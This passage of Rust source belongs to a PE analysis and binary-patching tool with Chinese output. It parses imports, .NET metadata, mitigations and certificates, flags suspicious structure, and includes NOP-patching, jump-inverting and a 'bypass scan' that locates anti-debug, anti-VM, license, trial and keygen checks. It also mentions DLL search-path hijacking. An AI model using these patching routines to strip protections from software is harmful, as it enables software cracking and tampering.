    let bind_rva = u32_le(&data, dd_start + 56);
    let bind_size = u32_le(&data, dd_start + 60);
    if bind_rva == 0 { return Err("无绑定导入".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    let bind_off = {
        let mut off = None;
        for &(va, vs, ro, rs) in &sections {
            if bind_rva >= va && bind_rva < va + vs.max(rs) && rs > 0 {
                off = Some((ro + (bind_rva - va)) as usize); break;
            }
        }
        off.ok_or("无法定位绑定导入")?
    };

    let mut out = format!("═══ 绑定导入: {} ═══\n\n", path);
    out.push_str(&format!("[·] BindImport RVA: 0x{:08X} 大小: {}B\n\n", bind_rva, bind_size));

    // IMAGE_BOUND_IMPORT_DESCRIPTOR: TimeDateStamp/OffsetModuleName/NumberOfModuleForwarderRefs
    let mut i = 0;
    loop {
        let e = bind_off + i * 8;
        if e + 8 > data.len() { break; }
        let timestamp = u32_le(&data, e);
        if timestamp == 0 { break; }
        let name_off = u16_le(&data, e + 4) as usize;
        let num_fwd = u16_le(&data, e + 6);
        let name_pos = bind_off + name_off;
        let dll_name = if name_pos < data.len() {
            let end = data[name_pos..].iter().position(|&b| b==0).map(|j| name_pos+j).unwrap_or(data.len());
            String::from_utf8_lossy(&data[name_pos..end.min(data.len())]).to_string()
        } else { "?".into() };

        let ts_str = if timestamp == 0xFFFFFFFF { "未绑定".into() }
            else { unix_to_str(timestamp) };
        out.push_str(&format!("  {}  |  {}", dll_name, ts_str));
        if num_fwd > 0 { out.push_str(&format!("  ({}个转发器)", num_fwd)); }
        out.push_str("\n");

        i += 1;
        if i > 100 { break; }
    }

    out.push_str(&format!("\n[·] 绑定DLL: {} 个\n", i));
    out.push_str("[*] 绑定导入: IAT预填充为特定DLL版本的函数地址\n");
    out.push_str("[*] 若目标系统DLL版本不匹配则回退到正常导入解析\n");

    Ok(out)
}

// ═══════════════ 延迟导入分析 v3.2 ═══════════════

fn delay_import(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let delay_rva = u32_le(&data, dd_start + 104);
    let delay_size = u32_le(&data, dd_start + 108);
    if delay_rva == 0 { return Err("无延迟导入".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    fn rva_off(rva: u32, secs: &[(u32,u32,u32,u32)]) -> Option<usize> {
        for &(va, vs, ro, rs) in secs {
            if rva >= va && rva < va + vs.max(rs) && rs > 0 {
                return Some((ro + (rva - va)) as usize);
            }
        }
        None
    }

    let delay_off = rva_off(delay_rva, &sections).ok_or("无法定位延迟导入")?;

    let mut out = format!("═══ 延迟导入: {} ═══\n\n", path);
    out.push_str(&format!("[·] DelayImport RVA: 0x{:08X} 大小: {}B\n\n", delay_rva, delay_size));

    // IMAGE_DELAYLOAD_DESCRIPTOR: Attributes/DllNameRVA/ModuleHandleRVA/ImportAddressTableRVA/ImportNameTableRVA/BoundImportAddressTableRVA/UnloadInformationTableRVA/TimeDateStamp
    let desc_size = if is_x64 { 64 } else { 32 };
    let mut i = 0;
    loop {
        let e = delay_off + i * desc_size;
        if e + 8 > data.len() { break; }
        let attrs = u32_le(&data, e);
        if attrs == 0 && u32_le(&data, e + 4) == 0 { break; }
        let name_rva = u32_le(&data, e + 4);
        let iat_rva = u32_le(&data, e + if is_x64 { 16 } else { 12 });

        let dll_name = if let Some(no) = rva_off(name_rva, &sections) {
            if no < data.len() {
                let end = data[no..].iter().position(|&b| b==0).map(|j| no+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[no..end.min(data.len())]).to_string()
            } else { "?".into() }
        } else { "?".into() };

        let mut func_count = 0;
        if let Some(iat_off) = rva_off(iat_rva, &sections) {
            let entry_sz = if is_x64 { 8 } else { 4 };
            loop {
                let fe = iat_off + func_count * entry_sz;
                if fe + entry_sz > data.len() { break; }
                let val = if is_x64 { u64_le(&data, fe) } else { u32_le(&data, fe) as u64 };
                if val == 0 { break; }
                func_count += 1;
                if func_count > 500 { break; }
            }
        }

        out.push_str(&format!("  {:30}  函数:{} | 属性:0x{:08X}\n", dll_name, func_count, attrs));
        i += 1;
    }

    out.push_str(&format!("\n[·] 延迟加载DLL: {} 个\n", i));
    out.push_str("[*] 延迟导入: 函数仅在首次调用时才解析, 启动时不计入加载时间\n");
    out.push_str("[!] 延迟导入DLL可能是注入目标 — 劫持DLL搜索路径即可拦截调用\n");

    Ok(out)
}

// ═══════════════ .NET元数据深度分析 v3.2 ═══════════════

fn dotnet_meta(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let clr_rva = u32_le(&data, dd_start + 14*8);
    let _clr_size = u32_le(&data, dd_start + 14*8 + 4);
    if clr_rva == 0 { return Err("非.NET程序集 — 无CLR头".into()); }

    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    fn rva_off(rva: u32, secs: &[(u32,u32,u32,u32)]) -> Option<usize> {
        for &(va, vs, ro, rs) in secs {
            if rva >= va && rva < va + vs.max(rs) && rs > 0 {
                return Some((ro + (rva - va)) as usize);
            }
        }
        None
    }

    let clr_off = rva_off(clr_rva, &sections).ok_or("无法定位CLR头")?;

    // COR20 header: cb/MAJOR/MINOR/MetaDataRVA/MetaDataSize/Flags/EntryPointToken/Resources/StrongNameSignature/...
    let meta_rva = u32_le(&data, clr_off + 8);
    let _meta_size = u32_le(&data, clr_off + 12);
    let flags = u32_le(&data, clr_off + 16);
    let entry_token = u32_le(&data, clr_off + 20);

    let mut out = format!("═══ .NET元数据分析: {} ═══\n\n", path);
    out.push_str(&format!("[·] CLR头RVA: 0x{:08X}\n", clr_rva));
    let mut fl = Vec::new();
    if flags & 1 != 0 { fl.push("ILONLY"); }
    if flags & 2 != 0 { fl.push("32BITREQUIRED"); }
    if flags & 4 != 0 { fl.push("IL_LIBRARY"); }
    if flags & 8 != 0 { fl.push("STRONGNAMESIGNED"); }
    if flags & 0x10 != 0 { fl.push("NATIVE_ENTRYPOINT"); }
    if flags & 0x10000 != 0 { fl.push("TRACKDEBUGDATA"); }
    if flags & 0x20000 != 0 { fl.push("32BITPREFERRED"); }
    out.push_str(&format!("[·] 标志: {}\n", fl.join(" | ")));
    out.push_str(&format!("[·] 入口Token: 0x{:08X}", entry_token));
    if entry_token != 0 {
        let table = (entry_token >> 24) & 0xFF;
        let idx = entry_token & 0xFFFFFF;
        let table_names = ["Module","TypeRef","TypeDef","FieldPtr","Field","MethodPtr","MethodDef","ParamPtr","Param","InterfaceImpl","MemberRef","Constant","CustomAttribute","FieldMarshal","DeclSecurity","ClassLayout","FieldLayout","StandAloneSig","EventMap","EventPtr","Event","PropertyMap","PropertyPtr","Property","MethodSemantics","MethodImpl","ModuleRef","TypeSpec","ImplMap","FieldRVA","ENCLog","ENCMap","Assembly","AssemblyProcessor","AssemblyOS","AssemblyRef","AssemblyRefProcessor","AssemblyRefOS","File","ExportedType","ManifestResource","NestedClass","GenericParam","MethodSpec","GenericParamConstraint"];
        if (table as usize) < table_names.len() {
            out.push_str(&format!(" ({}[{}])\n", table_names[table as usize], idx));
        } else { out.push_str("\n"); }
    } else { out.push_str("\n"); }

    // Metadata root: "BSJB" magic + version + streams
    if let Some(meta_off) = rva_off(meta_rva, &sections) {
        if meta_off + 20 <= data.len() && &data[meta_off..meta_off+4] == b"BSJB" {
            let ver_len = u32_le(&data, meta_off + 12) as usize;
            let ver_start = meta_off + 16;
            let version = String::from_utf8_lossy(&data[ver_start..ver_start+ver_len.min(64)]);
            out.push_str(&format!("[·] 运行时版本: {}\n", version.trim_end_matches('\0')));

            let streams_off = ver_start + ver_len;
            if streams_off + 2 <= data.len() {
                let num_streams = u16_le(&data, streams_off) as usize;
                out.push_str(&format!("\n─── 元数据流 ({} 个) ───\n", num_streams));

                let mut sp = streams_off + 2;
                for _ in 0..num_streams.min(10) {
                    if sp + 8 > data.len() { break; }
                    let s_off = u32_le(&data, sp) as usize;
                    let s_size = u32_le(&data, sp + 4) as usize;
                    let name_end = data[sp+8..].iter().position(|&b| b==0).unwrap_or(32);
                    let s_name = String::from_utf8_lossy(&data[sp+8..sp+8+name_end.min(32)]).to_string();
                    let aligned = ((sp + 8 + name_end + 1) + 3) / 4 * 4;

                    let type_desc = match s_name.as_str() {
                        "#~" => "元数据表流 (Table Stream) — 包含所有元数据表",
                        "#Strings" => "字符串堆 (String Heap) — 元数据字符串存储",
                        "#US" => "用户字符串堆 (User String Heap)",
                        "#GUID" => "GUID堆 (GUID Heap)",
                        "#Blob" => "Blob堆 (Blob Heap) — 签名/默认值",
                        _ => "未知",
                    };
                    out.push_str(&format!("  {:12}  偏移:0x{:08X}  大小:{}KB  {}\n", s_name, meta_off + s_off, s_size/1024, type_desc));

                    // For #~, parse the first few bytes (table header)
                    if s_name == "#~" && meta_off + s_off + 24 <= data.len() {
                        let tbl_off = meta_off + s_off;
                        let _heap_sizes = data[tbl_off + 6];
                        let valid: u64 = u64_le(&data, tbl_off + 8);
                        out.push_str("    [·] 含表: ");
                        let tbls = ["Module","TypeRef","TypeDef","Field","MethodDef","Param","InterfaceImpl","MemberRef","Constant","CustomAttribute","FieldMarshal","DeclSecurity","ClassLayout","FieldLayout","StandAloneSig","EventMap","Event","PropertyMap","Property","MethodSemantics","MethodImpl","ModuleRef","TypeSpec","ImplMap","FieldRVA","Assembly","AssemblyRef","File","ExportedType","ManifestResource","NestedClass","GenericParam","MethodSpec","GenericParamConstraint"];
                        let mut present = Vec::new();
                        for (ti, tn) in tbls.iter().enumerate() {
                            if ti < 64 && valid & (1u64 << ti) != 0 {
                                present.push(*tn);
                            }
                        }
                        out.push_str(&present.join(", "));
                        out.push_str("\n");
                    }

                    sp = aligned;
                }
            }
        }
    }

    Ok(out)
}

// ═══════════════ 安全检查 v3.2 ═══════════════

fn checksec(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dll_chars = u16_le(&data, opt_start + 70);
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };

    let mut out = format!("═══ 安全检查: {} ═══\n\n", path);
    out.push_str(&format!("[·] 架构: {}\n\n", if is_x64 { "x64" } else { "x86" }));

    // DLL Characteristics
    out.push_str("─── DLL特征 ───\n");
    let checks = [
        (0x0100, "DEP/NX Compatible", dll_chars & 0x0100 != 0),
        (0x0040, "ASLR (DYNAMIC_BASE)", dll_chars & 0x0040 != 0),
        (0x0020, "HIGH_ENTROPY_VA (x64 ASLR)", dll_chars & 0x0020 != 0),
        (0x4000, "CET Compatible (Intel Shadow Stack)", dll_chars & 0x4000 != 0),
        (0x8000, "CFG (Control Flow Guard)", dll_chars & 0x8000 != 0),
        (0x2000, "AppContainer Compatible", dll_chars & 0x2000 != 0),
        (0x0080, "NX Compatible (no-isolation)", dll_chars & 0x0080 != 0),
        (0x0002, "FORCE_INTEGRITY (签名强制)", dll_chars & 0x0002 != 0),
    ];
    for (_, name, enabled) in &checks {
        out.push_str(&format!("  [{}] {}\n", if *enabled { "+" } else { "-" }, name));
    }

    // LoadConfig further checks
    let lc_rva = u32_le(&data, dd_start + 80);
    let lc_size = u32_le(&data, dd_start + 84);
    if lc_rva > 0 && lc_size > 0 {
        let num_sections = u16_le(&data, coff + 2) as usize;
        let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
        let mut sections = Vec::new();
        for i in 0..num_sections {
            let o = sec_start + i * 40;
            sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
        }
        let lc_off = {
            let mut off = None;
            for &(va, vs, ro, rs) in &sections {
                if lc_rva >= va && lc_rva < va + vs.max(rs) && rs > 0 {
                    off = Some((ro + (lc_rva - va)) as usize); break;
                }
            }
            off
        };

        if let Some(lco) = lc_off {
            out.push_str("\n─── LoadConfig安全 ───\n");
            let get_field = |off: usize| -> u64 {
                if lco + off + 8 <= data.len() && off + 8 <= lc_size as usize {
                    u64_le(&data, lco + off)
                } else if lco + off + 4 <= data.len() {
                    u32_le(&data, lco + off) as u64
                } else { 0 }
            };

            let gs_cookie = get_field(if is_x64 { 48 } else { 40 });
            out.push_str(&format!("  [{}] GS Stack Cookie (栈保护)\n", if gs_cookie != 0 { "+" } else { "-" }));

            let cfg_check = get_field(if is_x64 { 80 } else { 64 });
            out.push_str(&format!("  [{}] CFG Check Function\n", if cfg_check != 0 { "+" } else { "-" }));

            if lc_size > if is_x64 { 128 } else { 96 } {
                let rfg = get_field(if is_x64 { 120 } else { 88 });
                out.push_str(&format!("  [{}] RFG (Return Flow Guard)\n", if rfg != 0 { "+" } else { "-" }));
            }
        }
    }

    // Exception/SafeSEH
    let exc_rva = u32_le(&data, dd_start + 24);
    let exc_size = u32_le(&data, dd_start + 28);
    out.push_str(&format!("\n  [{}] {} ({}条目)\n",
        if exc_rva != 0 { "+" } else { "-" },
        if is_x64 { ".pdata (x64异常处理)" } else { "SafeSEH" },
        if is_x64 { exc_size as usize / 12 } else { exc_size as usize / 4 }));

    // Summary
    let score = checks.iter().filter(|(_,_,e)| *e).count();
    out.push_str(&format!("\n─── 安全评分: {}/8 缓解已启用 ───\n", score));
    if score >= 6 { out.push_str("[+] 安全缓解良好; 利用难度高\n"); }
    else if score >= 3 { out.push_str("[*] 中等安全; 部分缓解缺失\n"); }
    else { out.push_str("[!] 安全薄弱; 多个缓解缺失, 易于利用\n"); }

    Ok(out)
}

// ═══════════════ 数字证书提取 v3.2 ═══════════════

fn cert_extract(path: &str, output: Option<&str>) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let sec_rva = u32_le(&data, dd_start + 32);
    let sec_size = u32_le(&data, dd_start + 36);
    if sec_rva == 0 || sec_size == 0 { return Err("无数字签名".into()); }

    let sig_off = sec_rva as usize;
    if sig_off + 8 > data.len() { return Err("签名数据越界".into()); }
    let cert_len = u32_le(&data, sig_off) as usize;
    let cert_type = u16_le(&data, sig_off + 6);

    let out_path = match output {
        Some(p) => p.to_string(),
        None => {
            let base = std::path::Path::new(path).file_stem()
                .unwrap_or_default().to_string_lossy().to_string();
            format!("{}_cert.der", base)
        }
    };

    let mut out = format!("═══ 证书提取: {} ═══\n\n", path);
    out.push_str(&format!("[·] 证书类型: 0x{:04X}\n", cert_type));
    out.push_str(&format!("[·] 证书大小: {}KB\n", cert_len/1024));

    if cert_type == 0x0002 {
        // PKCS#7 SignedData — 提取证书部分 (跳过8B WIN_CERTIFICATE头)
        let pkcs_start = sig_off + 8;
        let pkcs_end = (pkcs_start + cert_len).min(data.len());
        let pkcs_data = &data[pkcs_start..pkcs_end];

        // 查找DER证书 (SEQUENCE tag = 0x30)
        // PKCS#7中的证书通常在 SignedData→certificates SET 中
        // 简化: 搜索 0x30 0x82 模式作为证书起始标记
        let mut cert_found = false;
        let mut i = 0;
        while i + 4 < pkcs_data.len() {
            if pkcs_data[i] == 0x30 && pkcs_data[i+1] == 0x82 {
                // 尝试确定证书长度
                let der_len = u16::from_be_bytes([pkcs_data[i+2], pkcs_data[i+3]]) as usize + 4;
                let cert_end = (i + der_len).min(pkcs_data.len());
                if cert_end <= pkcs_data.len() && der_len > 100 {
                    let cert_data = &pkcs_data[i..cert_end];
                    std::fs::write(&out_path, cert_data).map_err(|e| format!("写入失败: {}", e))?;
                    out.push_str(&format!("[+] 提取成功! → {}\n", out_path));
                    out.push_str(&format!("[+] DER证书: {}B\n", der_len));

                    // 尝试转PEM (手动base64)
                    let pem_path = out_path.replace(".der", ".pem");
                    let b64 = simple_base64(cert_data);
                    let pem = format!("-----BEGIN CERTIFICATE-----\n{}\n-----END CERTIFICATE-----\n",
                        b64.as_bytes().chunks(64).map(|c| String::from_utf8_lossy(c)).collect::<Vec<_>>().join("\n"));
                    std::fs::write(&pem_path, &pem).ok();
                    out.push_str(&format!("[+] PEM证书: {}\n", pem_path));
                    cert_found = true;
                    break;
                }
            }
            i += 1;
        }
        if !cert_found {
            // 直接保存整个PKCS#7
            std::fs::write(&out_path, pkcs_data).map_err(|e| format!("写入失败: {}", e))?;
            out.push_str(&format!("[+] 保存PKCS#7: {} ({}B)\n", out_path, pkcs_data.len()));
        }
    } else {
        // 非PKCS#7, 直接保存
        let raw = &data[sig_off..(sig_off + cert_len).min(data.len())];
        std::fs::write(&out_path, raw).map_err(|e| format!("写入失败: {}", e))?;
        out.push_str(&format!("[+] 保存原始证书: {} ({}B)\n", out_path, raw.len()));
    }

    Ok(out)
}

// ═══════════════ 可疑PE检测 v3.2 ═══════════════

fn dirty_check(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_va = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };
    let image_size = u32_le(&data, opt_start + 56) as usize;
    let headers_size = u32_le(&data, opt_start + 60) as usize;
    let section_align = u32_le(&data, opt_start + 32) as usize;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;

    let mut out = format!("═══ 可疑PE检测: {} ═══\n\n", path);
    let mut alerts = 0u32;

    // 1. 入口点检查
    if entry_va == 0 {
        out.push_str("[!] ALERT: 入口点为0 — 可疑\n");
        alerts += 1;
    }
    if entry_va > image_size as u64 {
        out.push_str("[!] ALERT: 入口点超出镜像大小\n");
        alerts += 1;
    }

    // 2. 节检查
    let mut prev_end = headers_size;
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        let name = String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string();
        let vsize = u32_le(&data, o + 8) as usize;
        let _vaddr = u32_le(&data, o + 12) as usize;
        let rsize = u32_le(&data, o + 16) as usize;
        let roff = u32_le(&data, o + 20) as usize;
        let chars = u32_le(&data, o + 36);

        // 空节名
        if name.is_empty() { out.push_str(&format!("[!] ALERT: 节#{} 名称为空\n", i+1)); alerts += 1; }

        // RAW size > virtual size
        if rsize > vsize + section_align {
            out.push_str(&format!("[!] ALERT: {} RawSize({}) >> VirtualSize({})\n", name, rsize, vsize));
            alerts += 1;
        }

        // 可写+可执行
        if chars & 0x20000000 != 0 && chars & 0x80000000 != 0 {
            out.push_str(&format!("[!] ALERT: {} 可写+可执行 (RWX!)\n", name));
            alerts += 1;
        }

        // 重叠检查
        if roff > 0 && roff < prev_end {
            out.push_str(&format!("[!] ALERT: {} 与前一节文件偏移重叠 (start=0x{:X} < prev_end=0x{:X})\n", name, roff, prev_end));
            alerts += 1;
        }
        prev_end = roff + rsize;

        // VSize = 0
        if vsize == 0 && rsize > 0 {
            out.push_str(&format!("[*] NOTE: {} VirtualSize=0 但 RawSize={}\n", name, rsize));
        }
    }

    // 3. PE头大小异常
    if headers_size < 256 { out.push_str(&format!("[*] NOTE: PE头偏小 ({}B)\n", headers_size)); }
    if headers_size > 4096 { out.push_str(&format!("[!] ALERT: PE头异常大 ({}B)\n", headers_size)); alerts += 1; }

    // 4. ImageBase对齐
    if image_base % 0x10000 != 0 {
        out.push_str(&format!("[!] ALERT: ImageBase未64K对齐: 0x{:016X}\n", image_base));
        alerts += 1;
    }

    // 5. 节对齐异常
    if section_align < 0x200 {
        out.push_str(&format!("[!] ALERT: SectionAlignment过小: {}\n", section_align));
        alerts += 1;
    }

    // 6. 检查导出表指向自身
    let export_rva = u32_le(&data, dd_start);
    let export_size = u32_le(&data, dd_start + 4);
    if export_rva > 0 && export_size > 0 {
        if export_rva < headers_size as u32 {
            out.push_str("[*] NOTE: 导出表在PE头内 (可能是正常.NET行为)\n");
        }
    }

    // 7. NumberOfRvaAndSizes截断
    let num_dd = u32_le(&data, opt_start + if is_x64 { 108 } else { 92 }) as usize;
    if num_dd < 16 {
        out.push_str(&format!("[!] ALERT: DataDirectory数量异常: {} (标准16)\n", num_dd));
        alerts += 1;
    }

    out.push_str(&format!("\n─── 结果: {} 个可疑项 ───\n", alerts));
    if alerts == 0 { out.push_str("[+] PE结构正常, 未发现明显可疑特征\n"); }
    else if alerts <= 2 { out.push_str("[*] 少量可疑项, 可能是编译器特性或轻度混淆\n"); }
    else { out.push_str("[!] 多个可疑特征! 可能被篡改/加壳/恶意构造\n"); }

    Ok(out)
}

// ═══════════════ 智能NOP v3.3 ═══════════════

fn smart_nop(path: &str, offset: usize, size: Option<usize>) -> Result<String, String> {
    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if offset >= data.len() { return Err("偏移超出文件范围".into()); }

    // 备份
    let bak = format!("{}.nop_bak", path);
    std::fs::copy(path, &bak).map_err(|e| format!("备份失败: {}", e))?;

    let nop_size = match size {
        Some(s) => s,
        None => {
            // 自动检测指令长度
            let b = data[offset];
            match b {
                // 短跳转 (2B)
                0xEB | 0x70..=0x7F => 2,
                // 近跳转/调用 (5B)
                0xE8 | 0xE9 => 5,
                // 近条件跳转 (6B)
                0x0F => if offset + 1 < data.len() {
                    match data[offset+1] {
                        0x80..=0x8F => 6,
                        _ => 2,
                    }
                } else { 1 },
                // PUSH imm32 (5B)
                0x68 => 5,
                // MOV reg,imm32 (5B)
                0xB8..=0xBF => 5,
                // CALL/JMP rm (2-7B)
                0xFF => {
                    if offset + 1 < data.len() {
                        let _modrm = data[offset+1];
                        2 + modrm_size(&data, offset+1)
                    } else { 1 }
                }
                // CMP/TEST rm,imm (3-7B)
                0x83 => {
                    if offset + 1 < data.len() {
                        2 + modrm_size(&data, offset+1) + 1
                    } else { 1 }
                }
                0x81 => {
                    if offset + 1 < data.len() {
                        2 + modrm_size(&data, offset+1) + 4
                    } else { 1 }
                }
                _ => 1,
            }
        }
    };

    if offset + nop_size > data.len() {
        return Err(format!("NOP大小({})超出文件范围", nop_size));
    }

    let orig: Vec<String> = data[offset..offset+nop_size].iter().map(|b| format!("{:02X}", b)).collect();
    for i in 0..nop_size { data[offset + i] = 0x90; }
    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    Ok(format!("═══ NOP修补完成 ═══\n  文件: {}\n  备份: {}\n  偏移: 0x{:08X}\n  原始: {}\n  NOP: {} x 0x90\n  [+] 指令已禁用 — 可通过备份恢复",
        path, bak, offset, orig.join(" "), nop_size))
}

// ═══════════════ 条件跳转反转 v3.3 ═══════════════

fn jmp_invert(path: &str, offset_str: &str) -> Result<String, String> {
    let offset = parse_offset(offset_str)?;
    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if offset >= data.len() { return Err("偏移超出文件范围".into()); }

    let bak = format!("{}.jmp_bak", path);
    std::fs::copy(path, &bak).map_err(|e| format!("备份失败: {}", e))?;

    let op = data[offset];
    // Jcc short: 0x70-0x7F
    // Jcc near: 0x0F 0x80-0x8F
    let (new_op, new_op2) = if op >= 0x70 && op <= 0x7F {
        // Invert: 0x74(JZ)↔0x75(JNZ), 0x72(JB)↔0x73(JAE), etc.
        // Even→+1, Odd→-1
        (if op & 1 == 0 { op + 1 } else { op - 1 }, 0u8)
    } else if op == 0x0F && offset + 1 < data.len() {
        let op2 = data[offset + 1];
        if op2 >= 0x80 && op2 <= 0x8F {
            (0x0F, if op2 & 1 == 0 { op2 + 1 } else { op2 - 1 })
        } else { return Err(format!("不支持的操作码: 0x{:02X} 0x{:02X}", op, op2)); }
    } else {
        return Err(format!("非条件跳转: 0x{:02X}", op));
    };

    let orig = if new_op2 != 0 {
        format!("0F {:02X}", data[offset+1])
    } else {
        format!("{:02X}", op)
    };

    data[offset] = new_op;
    if new_op2 != 0 { data[offset + 1] = new_op2; }

    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    let new_desc = if new_op2 != 0 {
        format!("0F {:02X}", new_op2)
    } else {
        format!("{:02X}", new_op)
    };

    Ok(format!("═══ 跳转反转完成 ═══\n  文件: {}\n  备份: {}\n  偏移: 0x{:08X}\n  原始指令: {} → 新指令: {}\n  [+] 条件跳转已反转! 回滚: 复制.bak覆盖",
        path, bak, offset, orig, new_desc))
}

// ═══════════════ 旁路扫描 v3.3 ═══════════════

fn bypass_scan(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    let mut out = format!("═══ 旁路扫描: {} ═══\n\n", path);

    // 搜索字符串引用
    let strings_data = {
        let mut sd = String::new();
        let mut cur = Vec::new();
        for &b in &data {
            if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
            else {
                if cur.len() >= 3 {
                    sd.push_str(&String::from_utf8_lossy(&cur));
                    sd.push('\n');
                }
                cur.clear();
            }
        }
        sd
    };

    let patterns = [
        ("IsDebuggerPresent", "反调试 — IsDebuggerPresent API"),
        ("CheckRemoteDebuggerPresent", "反调试 — CheckRemoteDebuggerPresent"),
        ("NtQueryInformationProcess", "反调试 — NtQueryInformationProcess"),
        ("NtGlobalFlag", "反调试 — PEB.NtGlobalFlag检查"),
        ("BeingDebugged", "反调试 — PEB.BeingDebugged"),
        ("OutputDebugString", "反调试 — OutputDebugString陷阱"),
        ("NtSetInformationThread", "反调试 — 隐藏线程"),
        ("ZwQuerySystemInformation", "反调试 — 系统信息枚举"),
        ("GetTickCount", "反调试 — 时间检测"),
        ("QueryPerformanceCounter", "反调试 — 高精度计时"),
        ("rdtsc", "反调试 — RDTSC指令"),
        ("VMware", "反VM — VMware检测"),
        ("VirtualBox", "反VM — VirtualBox检测"),
        ("VBOX", "反VM — VBox"),
        ("QEMU", "反VM — QEMU检测"),
        ("Xen", "反VM — Xen检测"),
        ("Hyper-V", "反VM — Hyper-V检测"),
        ("sandbox", "沙箱检测"),
        ("wine", "Wine检测"),
        ("license", "许可证检查"),
        ("serial", "序列号验证"),
        ("register", "注册验证"),
        ("trial", "试用期检查"),
        ("activate", "激活检查"),
        ("keygen", "Keygen相关"),
        ("blacklist", "黑名单检查"),
        ("GetSystemInfo", "环境检测"),
        ("CreateToolhelp32Snapshot", "进程枚举"),
        ("FindWindow", "窗口查找 — 检测分析工具"),
        ("SetWindowsHookEx", "消息钩子 — 键盘记录/监控"),
        ("CryptAcquireContext", "加密操作 — 可能是License"),
    ];

    let mut found = 0u32;
    for (pattern, desc) in &patterns {
        if strings_data.to_lowercase().contains(&pattern.to_lowercase()) {
            out.push_str(&format!("  [!] {} → {}\n", pattern, desc));
            found += 1;
        }
    }

    // 搜索函数调用模式 (IAT)
    let import_strings = {
        let mut is = String::new();
        let mut cur = Vec::new();
        for &b in &data {
            if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
            else if cur.len() >= 3 {
                is.push_str(&String::from_utf8_lossy(&cur));
                is.push('\n');
                cur.clear();
            } else { cur.clear(); }
        }
        is
    };

    // PE导入表中搜索
    let iat_patterns = [
        ("IsDebuggerPresent", "kernel32.dll!IsDebuggerPresent — NOP掉此调用"),
        ("CheckRemoteDebuggerPresent", "kernel32.dll!CheckRemoteDebuggerPresent — NOP"),
        ("TerminateProcess", "kernel32.dll!TerminateProcess — 反破解自杀"),
        ("ExitProcess", "kernel32.dll!ExitProcess — 反破解退出"),
    ];

    for (pattern, desc) in &iat_patterns {
        if import_strings.to_lowercase().contains(&pattern.to_lowercase()) {
            out.push_str(&format!("  [+] IAT: {} → {}\n", pattern, desc));
            found += 1;
        }
    }

    out.push_str(&format!("\n[*] 发现 {} 个可疑模式\n", found));
    if found > 0 {
        out.push_str("[!] 建议:\n");
        out.push_str("  - 使用 dll_nop NOP掉反调试API的call指令\n");
